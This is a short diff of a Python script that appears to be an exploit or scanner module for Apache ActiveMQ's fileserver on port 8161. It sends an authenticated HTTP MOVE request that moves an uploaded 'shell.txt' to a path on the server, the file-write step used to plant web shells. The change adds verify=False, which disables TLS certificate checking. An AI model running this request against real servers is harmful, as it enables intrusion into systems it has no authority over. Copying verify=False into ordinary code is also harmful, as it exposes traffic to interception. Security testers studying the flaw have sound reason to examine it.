@@ -17,7 +17,7 @@ def run(url):
             'Authorization' : 'Basic ' + base64.b64encode((user + ':' + pwd).encode()).decode(),
             'Destination':'file:/tmp/test.txt',
         }
-    req = requests.request('MOVE', url+':8161/fileserver/shell.txt', headers=headers, timeout=5)
+    req = requests.request('MOVE', url+':8161/fileserver/shell.txt', headers=headers, timeout=5, verify=False)
     if req.status_code == 204:
         return 'ActiveMQ move file success'
     else:
